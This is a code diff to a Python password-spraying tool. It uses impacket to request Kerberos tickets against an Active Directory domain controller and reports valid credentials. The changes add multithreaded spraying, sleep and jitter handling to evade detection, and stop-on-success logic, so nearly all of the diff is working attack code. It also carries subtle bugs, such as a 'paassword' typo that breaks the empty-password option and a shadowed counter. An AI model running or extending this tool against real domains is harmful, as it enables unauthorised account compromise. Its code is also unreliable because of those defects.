@@ -9,7 +9,7 @@ import ldap3
 import json
 import ssl
 import sys
-from impacket.krb5.kerberosv5 import getKerberosTGT
+from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
 from impacket.krb5 import constants
 from impacket.krb5.types import Principal
 import os
@@ -17,6 +17,7 @@ from rich.console import Console
 from datetime import datetime
 import time
 from random import randint
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 show_banner = '''
 
@@ -34,6 +35,9 @@ show_banner = '''
 
 '''
 console = Console()
+
+tried = 0
+valid = 0
 
 def arg_parse():
     parser = argparse.ArgumentParser(add_help=True,description=
@@ -58,6 +62,7 @@ def arg_parse():
     unauth_parser.add_argument("-n", action="store_true", help="Attempt authentication with an empty password.")
     unauth_parser.add_argument("-sleep", action="store", help="Length of time to sleep between attempts in seconds.", type=int)
     unauth_parser.add_argument("-jitter", action="store", help="Add jitter to sleep time.", type=int)
+    unauth_parser.add_argument("-threads", action="store", help="Number of threads to spray with. Default: 10", default=10, type=int)
 
 
     auth_parser = subparsers.add_parser("auth", help="Query the domain for pre Windows 2000 machine accounts.")
@@ -78,6 +83,7 @@ def arg_parse():
     auth_parser.add_argument("-n", action="store_true", help="Attempt authentication with an empty password.")
     auth_parser.add_argument("-sleep", action="store", help="Length of time to sleep between attempts in seconds.", type=int)
     auth_parser.add_argument("-jitter", action="store", help="Add jitter to sleep time.", type=int)
+    auth_parser.add_argument("-threads", action="store", help="Number of threads to spray with. Default: 10", default=10, type=int)
 
    
 
@@ -388,64 +394,82 @@ def printlog(line, outputfile):
         f.write("{}\n".format(line))
         f.close
 
+
+def delay(sleep, jitter):
+    if sleep and jitter:
+        delay = ""
+        delay = sleep
+        jitter = jitter
+        delay = delay + (delay * (randint(1, jitter) / 100))
+        print (f'Sleeping {delay} seconds until next attempt.')
+        time.sleep(delay)
+    elif sleep and not jitter:
+        delay = ""
+        delay = sleep
+        print(f'Sleeping {delay} seconds until next attempt.')
+        time.sleep(delay)
+        
+def spray(cred, n, domain, ip, save, outputfile, accounts, status, sleep, jitter, verbose):
+    global tried
+    global valid
+    status.update(f"Tried {tried}/{accounts}. {valid} valid.")
+    tried += 1
+    username, password = cred.split(":")
+    if n:
+        paassword = ''
+    try:
+        executer = GETTGT(username, password, domain, ip)
+        validate = executer.run(save)
+    except KerberosError:
+        if verbose:
+            if n:
+                line = (f'[-] Invalid credentials: {domain}\\{username}:nopass')
+            else:
+                line = (f'[-] Invalid credentials: {domain}\\{cred}')
+            print (line)
+            if outputfile:
+                    printlog(line, outputfile)
+        delay(sleep, jitter)
+        return False
+    if validate:
+        valid += 1
+        if n:
+            line = (f'[+] VALID CREDENTIALS: {domain}\\{username}:nopass')
+        else:                        
+            line = (f'[+] VALID CREDENTIALS: {domain}\\{cred}')
+        print (line)
+        if outputfile:
+                printlog(line, outputfile)
+        
+        delay(sleep, jitter)
+        return True
+
 def pw_spray(creds, args):
     dt = datetime.now()
     print("Testing started at", dt)
     if args.n: 
         print("Testing with empty password.")
     with console.status(f"", spinner="dots") as status:
-        tried = 0
         valid = 0
         accounts = len(creds)
-        for cred in creds:
+        if args.sleep:
+            args.threads = 1 # no point in threading if we're sleeping b/w attempts
+        with ThreadPoolExecutor(max_workers=args.threads) as pool:
             try:
-                tried += 1
-                status.update(f"Tried {tried}/{accounts}. {valid} valid.")
-                username, password = cred.split(":")
-                save = False
-                if args.n:
-                    executer = GETTGT(username, '', args.d, args.dc_ip)
-                else:
-                    executer = GETTGT(username, password, args.d, args.dc_ip)
-                if args.save:
-                    save=True
-                validate = executer.run(save)
-                if validate:
-                    valid += 1
-                    if args.n:
-                        line = (f'[+] VALID CREDENTIALS: {args.d}\\{username}:nopass')
-                    else:                        
-                        line = (f'[+] VALID CREDENTIALS: {args.d}\\{cred}')
-                    print (line)
-                    if args.outputfile:
-                            printlog(line, args.outputfile)
-                    if args.stoponsuccess:
+                # queue the jobs
+                future_validate = {pool.submit(spray, cred, args.n, args.d, args.dc_ip, args.save, args.outputfile, accounts, status, args.sleep, args.jitter, args.verbose): cred for cred in creds}
+                
+                # as threads complete, check if we should be stopping
+                for validate in as_completed(future_validate):
+                    if validate._result and args.stoponsuccess:
                         print("Valid credential found! Stopping session...")
-                        break
+                        pool.shutdown(wait=False, cancel_futures=True)
+                        sys.exit()
+                        
             except KeyboardInterrupt:
                 print("Stopping session...")
                 sys.exit()
-            except:
-                if args.verbose:
-                    if args.n:
-                        line = (f'[-] Invalid credentials: {args.d}\\{username}:nopass')
-                    else:
-                        line = (f'[-] Invalid credentials: {args.d}\\{cred}')
-                    print (line)
-                    if args.outputfile:
-                            printlog(line, args.outputfile)
-            if args.sleep and args.jitter:
-                delay = ""
-                delay = args.sleep
-                jitter = args.jitter
-                delay = delay + (delay * (randint(1, jitter) / 100))
-                print (f'Sleeping {delay} seconds until next attempt.')
-                time.sleep(delay)
-            elif args.sleep and not args.jitter:
-                delay = ""
-                delay = args.sleep
-                print(f'Sleeping {delay} seconds until next attempt.')
-                time.sleep(delay)
+            
 
 def parse_input(inputfile, args):
     creds = []
